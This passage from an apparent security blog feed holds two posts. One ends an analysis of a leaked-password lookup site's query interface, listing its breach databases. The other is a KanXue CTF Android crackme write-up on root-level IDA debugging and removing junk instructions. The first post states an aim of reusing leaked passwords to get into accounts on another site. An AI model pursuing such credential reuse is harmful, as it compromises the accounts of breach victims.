== _$[32]) &#123;</span><br><span class="line">        $(_$[33])[&quot;focus&quot;]();</span><br><span class="line">        alert(_$[34]);</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    ;if (somd5com490d63bb2[&quot;length&quot;] &lt; 4) &#123;</span><br><span class="line">        alert(_$[35]); //&quot;关键字长度请大于4!!&quot;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    ;var somd5combdba21b9c = $(_$[36])[&quot;val&quot;](); //选择的搜索类型，1，2,3</span><br><span class="line">    var somd5comd7f929c0a = $(_$[37])[&quot;val&quot;](); //匹配类型，1模糊,2精确</span><br><span class="line">    somd5com326e7999e = new Date()[&quot;getTime&quot;](); //时间戳</span><br><span class="line">    somd5comdd52905dc = 0;</span><br><span class="line">    for (var somd5comb93c3a502 = 0; somd5comb93c3a502 &lt; database[&quot;length&quot;]; somd5comb93c3a502++) &#123;</span><br><span class="line">        get_data(somd5com490d63bb2, somd5combdba21b9c, somd5comd7f929c0a, database, somd5comb93c3a502)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>诶，忘了一件事，我们是找table的，在哪里呢？！</p>
<p>其实就是上面代码中的database了，这里循环每个table通过get_data(内部ajax访问)来搜索结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var somd5comb93c3a502 = 0; somd5comb93c3a502 &lt; database[&quot;length&quot;]; somd5comb93c3a502++) &#123;</span><br><span class="line">        get_data(somd5com490d63bb2, somd5combdba21b9c, somd5comd7f929c0a, database, somd5comb93c3a502)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在dump出来的js代码中一搜，database没有找到定义，我靠！什么情况！调试到getdata时，确实是有值的，dump内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&quot;06_cn_mumayi_jd_com&quot;,&quot;1010wan_beihaiw_duowan&quot;,&quot;12306_cn&quot;,&quot;131_xiu_tianya&quot;,</span><br><span class="line">&quot;17173_com&quot;,&quot;212300_cxhr_zhaopin_com&quot;,&quot;212300_cxhr_zhaopin_copy&quot;,&quot;24buy_cd&quot;,&quot;51cto_com_new&quot;,</span><br><span class="line">...] //一部分</span><br></pre></td></tr></table></figure>
<p>但是我能就这么算了吗？！database究竟哪里来的，真想只有一个，去html再看一眼，搜到如下内容，嗯，看来是了，服务器返回的database。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;./ajax.php?act=database&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>访问<code>http://cha.hxsec.com/ajax.php?act=database</code>，拿到返回的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var database = new Array(&quot;06_cn_mumayi_jd_com&quot;,&quot;1010wan_beihaiw_duowan&quot;,&quot;12306_cn&quot;,&quot;131_xiu_tianya&quot;,&quot;17173_com&quot;,&quot;212300_cxhr_zhaopin_com&quot;,&quot;212300_cxhr_zhaopin_copy&quot;,&quot;24buy_cd&quot;,&quot;51cto_com_new&quot;,&quot;51job_com&quot;,&quot;52pk_com&quot;,&quot;55_la&quot;,&quot;766_tuan800_wanmei_37&quot;,&quot;7k7k_com&quot;,&quot;admin5_apphan_07073_soyun&quot;,&quot;aipai_com&quot;,&quot;all_hack_website&quot;,&quot;av_creditcard_com_cn&quot;,&quot;ccidnet_lashou_com&quot;,&quot;cnnb_mop_qinbao_jiapin_qd315&quot;,&quot;cnzz_com&quot;,&quot;co188_com&quot;,&quot;csdn_net&quot;,&quot;damai_cn&quot;,&quot;dangdang_com&quot;,&quot;dodonew_com&quot;,&quot;gfan_com&quot;,&quot;hiapk_com&quot;,&quot;houdao_com&quot;,&quot;ipart_cn&quot;,&quot;jxjatv_073yx_moko_treo8_paojiao&quot;,&quot;jxrsrc_zhenai&quot;,&quot;kaixin001_com-ispeak_com&quot;,&quot;mail_126_com&quot;,&quot;mail_163_com&quot;,&quot;mail_qq_sina&quot;,&quot;mail_qq_sohu&quot;,&quot;pconline_com_cn&quot;,&quot;pingan_com&quot;,&quot;qiannao_dedecms_baofeng&quot;,&quot;qq_old_password&quot;,&quot;radius-qingdaonews_com&quot;,&quot;renren_com&quot;,&quot;seowhy_shooter-tatazu_book118_cs&quot;,&quot;sorry_unknown&quot;,&quot;sorry_unknown2&quot;,&quot;tgbus_com&quot;,&quot;tpy100_com-jia_com&quot;,&quot;uuu9_com&quot;,&quot;weibo_com&quot;,&quot;xda_comicdd_game&quot;,&quot;xiaohua_other&quot;,&quot;xiaomi_com&quot;);</span><br></pre></td></tr></table></figure>
<p>也知道前面的database变量怎么来的了，为了database有效，<code>ajax.php?act=database</code>是在system.js加载完之后发送的请求。</p>
<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>ok，分析告一段落，table拿到了，接口所有信息都弄清楚了，下面就是开始码代码了！</p>
<p>另外，我只想对写system.js的同志说，nmmmp！那一段中文啥用没有，只能激起fn！</p>
<p>有不敬之处，敬请见谅！</p>
<p>有一点小小的分析技巧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//猜猜怎么看！</span><br></pre></td></tr></table></figure>
<div style="display:none;"><br><br>这种eval(x)如何分析呢？这里分享一个技巧<br>调试中，得到x之后，如果继续f10，那肯定就飞了，还要继续分析的，怎么办呢？<br><br>使用下面的方法：<br>x = “debugger;\r\n” + x;<br><br>然后f10就会在debugger断下来，然后就跟普通的js分析一样了<br><br>感谢chrome强大的工具！<br><br>希望这点没让大家失望！<br><br></div>

<p>代码地址，有需要请移步：<br><a href="https://github.com/anhkgg/hxsec_search" target="_blank" rel="noopener">https://github.com/anhkgg/hxsec_search</a></p>
<p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/hxsec-search-pwd-interface-analyze">https://anhkgg.github.io/hxsec-search-pwd-interface-analyze</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-开始&quot;&gt;&lt;a href=&quot;#0x00-开始&quot; class=&quot;headerlink&quot; title=&quot;0x00 开始&quot;&gt;&lt;/a&gt;0x00 开始&lt;/h1&gt;&lt;p&gt;最近爬个站的数据，然后想扫一下其他网站的同一个账号名能否找到泄露的密码，然后在这个站嘿嘿一下…&lt;/p&gt;
&lt;p&gt;在 &lt;a href=&quot;https://www.sec-wiki.com/topic/12&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sec-wiki&lt;/a&gt; 找到了&lt;a href=&quot;http://cha.hxsec.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这个密码泄露查询网站&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;随便用了一下，发现网站虽然讲密码打码了，但是某些数据还是可以猜出来原始的内容，或者通过简单的计算拿到原始的内容。&lt;/p&gt;
&lt;p&gt;but，我不能一个个输入然后看吧，数据虽然少，也有上千条啊，怎么说也是个python程序员，怎么也得鼓捣一下。&lt;/p&gt;
&lt;p&gt;分析一下hxsec的查询接口，用python批量一下。&lt;/p&gt;
    
    </summary>
    
      <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>
    
    
      <category term="cha.hxsec.com" scheme="https://anhkgg.github.io/tags/cha-hxsec-com/"/>
    
      <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>
    
      <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>
    
      <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>
    
      <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>
    
      <category term="requests" scheme="https://anhkgg.github.io/tags/requests/"/>
    
      <category term="password" scheme="https://anhkgg.github.io/tags/password/"/>
    
      <category term="密码泄漏" scheme="https://anhkgg.github.io/tags/%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F/"/>
    
      <category term="华西安全网" scheme="https://anhkgg.github.io/tags/%E5%8D%8E%E8%A5%BF%E5%AE%89%E5%85%A8%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>看雪CTF2017第六题 Ericky-apk writeup</title>
    <link href="https://anhkgg.github.io/kxctf2017-writeup6/"/>
    <id>https://anhkgg.github.io/kxctf2017-writeup6/</id>
    <published>2017-06-13T08:37:12.000Z</published>
    <updated>2017-06-17T08:49:05.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>题目入口：<a href="http://ctf.pediy.com/game-fight-36.htm" target="_blank" rel="noopener">http://ctf.pediy.com/game-fight-36.htm</a></p>
<p>本题是安卓cm，目测肯定需要调试so。</p>
<p>准备工具：</p>
<ol>
<li>ApkIde改之理（其他类似的也行，能够反编译apk，得到jar,so等）</li>
<li>IDA（用于调试so），需要6.x以上，忘了是x几，我用的6.6</li>
<li>adb(ApkIde改之理就有)</li>
</ol>
<a id="more"></a>
<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>将6-Ericky kanxue.apk拖进ApkIDE改之理，等待编译（没有加壳），ok。</p>
<p>在右侧树结构栏中，找到smali-&gt;android-&gt;com-&gt;miss-&gt;rfchen，列表中就是java层的主要函数。</p>
<p>点击MainActivity.smali，然后点击工具栏中jd-gui.exe，抓到java源码查看。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class MainActivity extends Activity</span><br><span class="line">&#123;</span><br><span class="line">  private EditText ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ = null;</span><br><span class="line">  private Button ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ = null;</span><br><span class="line"></span><br><span class="line">  protected void onCreate(Bundle paramBundle)</span><br><span class="line">  &#123;</span><br><span class="line">    super.onCreate(paramBundle);</span><br><span class="line">    setContentView(2130968603);</span><br><span class="line">    this.ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ = ((Button)findViewById(2131427415));</span><br><span class="line">    this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ = ((EditText)findViewById(2131427416));</span><br><span class="line">    this.ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ.setOnClickListener(new View.OnClickListener()</span><br><span class="line">    &#123;</span><br><span class="line">      public void onClick(View paramView)</span><br><span class="line">      &#123;</span><br><span class="line">        MainActivity.this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ()</span><br><span class="line">  &#123;</span><br><span class="line">    String str = this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ.getText().toString().trim();</span><br><span class="line">    StringBuilder localStringBuilder = new StringBuilder();</span><br><span class="line">    localStringBuilder.append(str);</span><br><span class="line">    if (utils.check(localStringBuilder.toString().trim()))</span><br><span class="line">    &#123;</span><br><span class="line">      Toast.makeText(this, MainActivity.1.utils.dbcb(&quot;xxxx&quot;), 0).show();</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(this, MainActivity.1.utils.dbcb(&quot;xxx&quot;), 0).show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这混淆的函数名我也是醉了，但这都不重要。输入key之后，然后点击按钮，进入OnClick，调用了上面代码中第二个函数（什么？我怎么知道的，因为它们哪个…点号…的函数名相同！！）。</p>
<p>然后调用了utils.check来验证，成功提示！这里成功和错误提示的字符串做过变换，通过utils.dbcb解密，不细看了，不重要！</p>
<p>进入utils.java，看到加载了so，调用的是这个so的导出函数，看反编译目录lib/armeabi-v7a（只提供了arm的so，要有个x86的好了），知道这个so是librf-chen.so。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//典型的NDK调用，查查就知道了！</span><br><span class="line">package com.miss.rfchen;</span><br><span class="line"></span><br><span class="line">public class utils</span><br><span class="line">&#123;</span><br><span class="line">  static</span><br><span class="line">  &#123;</span><br><span class="line">    System.loadLibrary(MainActivity.1.utils.dbcb(&quot;xxxx&quot;));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static native boolean check(String paramString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么重点来了，要分析librf-chen.so的check函数，才能搞定此题。</p>
<h1 id="准备调试"><a href="#准备调试" class="headerlink" title="准备调试"></a>准备调试</h1><p>早上提前学习了一下so调试方法，找到了看雪安卓大神的教程，就是参考中的IDA动态调试技术，然后用上了，很好用！</p>
<h2 id="跟着走"><a href="#跟着走" class="headerlink" title="跟着走"></a>跟着走</h2><p>下面开始照着做。</p>
<ol>
<li>连上手机（或者模拟器），使用adb devices看看成功连上没有</li>
<li>adb push ../dbgsrv/android_server /sdcard/sv，教程是直接放入/data/data，一般权限不够</li>
<li>然后进入shell，adb shell，输入su，获得root权限，然后cp /sdcard/sv /data/data/sv</li>
<li>修改sv权限，chmod 777 /data/data/sv</li>
<li>运行sv，/data/data/sv，默认监听到23946端口，Listening on port #23946。这步有个细节，不能直接adb shell /data/data/sv，这样权限不够，无法读取到进程信息，需要adb shell; su; /data/data/sv</li>
<li>再开一个cmd，然后运行adb forward tcp:23946 tcp:23946</li>
<li>运行一个idaq.exe，然后在菜单debugger-&gt;attach-&gt;remote Armlinux/android debugger，输入localhost, 23946,ok</li>
<li>弹出进程框，按下Alt+T，输入chen，搜索到1808 [32] com.miss.rfchen，ok</li>
<li>F9运行</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\ApkIDEz&gt;    .\adb.exe shell</span><br><span class="line">shell@your phone:/ $ su</span><br><span class="line">su</span><br><span class="line">root@your phone:/ # /data/data/sv</span><br><span class="line">/data/data/sv</span><br><span class="line">IDA Android 32-bit remote debug server(ST) v1.17. Hex-Rays (c) 2004-2014</span><br></pre></td></tr></table></figure>
<p>在界面中输入key，然后点击按钮，此时librf-chen.so才加载，然后ctrl+s，alt+t，输入librf找到librf-chen.so的基地址信息(记为base)，记下来。</p>
<p>用另一个ida打开librf-chen.so，找到check导出函数的偏移地址00002814，计算base+00002814，然后g在IDA调试器中输入该地址，加上断点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check(_JNIEnv *,_jclass *,_jstring *) 00002814</span><br></pre></td></tr></table></figure>
<p>IDA基本调试快捷键和OD一样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F9: 运行</span><br><span class="line">F8: 步过</span><br><span class="line">F7：步入</span><br></pre></td></tr></table></figure></p>
<p>F9，跑起来，然后再次点击按钮，就断下来，进入了check。</p>
<p>下面就是跟和调试的过程了，看数据，看流程，分析算法！</p>
<h2 id="arm汇编基础"><a href="#arm汇编基础" class="headerlink" title="arm汇编基础"></a>arm汇编基础</h2><p>得提前有个准备，看看arm指令，了解基本的指令，函数调用方式，下面列几个，更多的就看参考中的文章了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOVS 同x86的mov</span><br><span class="line">LDR 加载内存数据到寄存器</span><br><span class="line">STR 寄存器数据存入内存</span><br><span class="line">B/BL 跳转/函数调用</span><br><span class="line">TST/CMP 比较</span><br><span class="line">ADD/SUB 加/减</span><br></pre></td></tr></table></figure>
<p>然后最主要的，函数调用的参数传递。arm默认使用的fastcall，通过r0,r1,r2,r3传递参数，超过4个参数，使用堆栈传递，r0也保存返回值。</p>
<h2 id="关键点跟踪"><a href="#关键点跟踪" class="headerlink" title="关键点跟踪"></a>关键点跟踪</h2><p>在check断下之后，先是一段数据初始化，先滤过，然后blt sub_2874，进入关键函数</p>
<p>然后看到通过MOVS，STR将一些字符放入了内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000288A 000 01 60                                         STR             R1, [R0]</span><br><span class="line">.text:0000288C 000 4A 20                                         MOVS            R0, #&apos;J&apos;</span><br><span class="line">.text:0000288E 000 79 21                                         MOVS            R1, #&apos;y&apos;</span><br><span class="line">.text:00002890 000 AD F8 22 00                                   STRH.W          R0, [SP,#arg_22]</span><br><span class="line">.text:00002894 000 AD F8 24 10                                   STRH.W          R1, [SP,#arg_24]</span><br><span class="line">.text:00002898 000 75 21                                         MOVS            R1, #&apos;u&apos;</span><br><span class="line">.text:0000289A 000 AD F8 26 10                                   STRH.W          R1, [SP,#arg_26]</span><br><span class="line">.text:0000289E 000 33 21                                         MOVS            R1, #&apos;3&apos;</span><br></pre></td></tr></table></figure>
<p>接着就看让我恐惧的一幕，b loc_2898开始各种跳转，指令操作，然后刚跳完又是一个b xxx，接着各种跳转，毫无疑问，这是一段花指令了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000289E                 B               loc_2898</span><br></pre></td></tr></table></figure>
<h2 id="花指令结构"><a href="#花指令结构" class="headerlink" title="花指令结构"></a>花指令结构</h2><p>经过多次跟踪，恶心到快吐的时候，终于看出话指令的基本结构了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:00002BE8                 PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BEC                 POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BF0                 B               sub_2C1A                     ；开始</span><br><span class="line"> PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BEC BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BF0 13 E0                                         B               sub_2C1A</span><br><span class="line"> ---------------------------------------------------------------------------</span><br><span class="line">.text:00002BF2 BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BF6 05 E0                                         B               sub_2C04 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002BF8 00 F1 01 00                                   ADD.W           R0, R0, #1</span><br><span class="line">.text:00002BFC 0A E0                                         B               loc_2C14 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002BFE 1B 46                                         MOV             R3, R3</span><br><span class="line">.text:00002C00 0E E0                                         B               loc_2C20 </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C02 10 E0                                         B               sub_2C26 ；跳到快执行的位置 </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C04 B1 B5                                         PUSH            &#123;R0,R4,R5,R7,LR&#125;</span><br><span class="line">.text:00002C06 01 E0                                         B               loc_2C0C </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C08 12 46                                         MOV             R2, R2</span><br><span class="line">.text:00002C0A 01 E0                                         B               loc_2C10</span><br><span class="line">.text:00002C0C 82 B0                                         SUB             SP, SP, #8</span><br><span class="line">.text:00002C0E FB E7                                         B               loc_2C08 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C10 02 B0                                         ADD             SP, SP, #8</span><br><span class="line">.text:00002C12 F1 E7                                         B               loc_2BF8 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C14 A0 F1 01 00                                   SUB.W           R0, R0, #1</span><br><span class="line">.text:00002C18 F1 E7                                         B               loc_2BFE </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C1A 2D E9 F0 47                                   PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C1E E8 E7                                         B               loc_2BF2 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C20 BD E8 B1 40                                   POP.W           &#123;R0,R4,R5,R7,LR&#125;</span><br><span class="line">.text:00002C24 ED E7                                         B               sub_2C02 </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C26 2D E9 F0 47                                   PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C2A BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C2E FF E7                                         B               sub_2C30 ；进入有效代码，一般是接着的地址</span><br><span class="line"></span><br><span class="line">.text:00002C30                 PUSH            &#123;R0,R4,R5,R7,LR&#125; ；开始一般会有一段对称没啥作用的话指令</span><br><span class="line">.text:00002C32                 SUB             SP, SP, #8</span><br><span class="line">.text:00002C34                 MOV             R2, R2</span><br><span class="line">.text:00002C36                 ADD             SP, SP, #8</span><br><span class="line">.text:00002C38                 ADD.W           R0, R0, #1</span><br><span class="line">.text:00002C3C                 SUB.W           R0, R0, #1</span><br><span class="line">.text:00002C40                 MOV             R3, R3</span><br><span class="line">.text:00002C42                 POP.W           &#123;R0,R4,R5,R7,LR&#125;</span><br><span class="line">.text:00002C46                 ADD.W           R1, R1, #1</span><br><span class="line">.text:00002C4A                 SUB.W           R1, R1, #1</span><br><span class="line">.text:00002C4E                 STRH.W          R0, [SP,#arg_30]</span><br><span class="line">.text:00002C52                 MOVS            R0, #0x44</span><br><span class="line">.text:00002C54                 PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C58                 POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C5C                 B               sub_2C86</span><br></pre></td></tr></table></figure>
<p>特征：</p>
<ol>
<li>每跳转一个分支，基本都要一段花（记为A段），就是从上面代码中注释开始的问题</li>
<li>进行几个跳转后，到了结束位置，跳入有效代码</li>
<li>有效代码开头一般也有加一段花（记为B段）</li>
<li>在A段话指令中，指令地址是向下增长的，也就是A开始往下拉一段，就能找到结束位置</li>
<li>B端一般无跳转，但是对称代码有多又少</li>
</ol>
<p>所以根据特征，去除话指令也挺方便，我使用的IDA的patch功能手工去花的，脚本牛可以写个脚本。</p>
<p>所有花指令填充的00 bf（NOP），然后就可以F5了。</p>
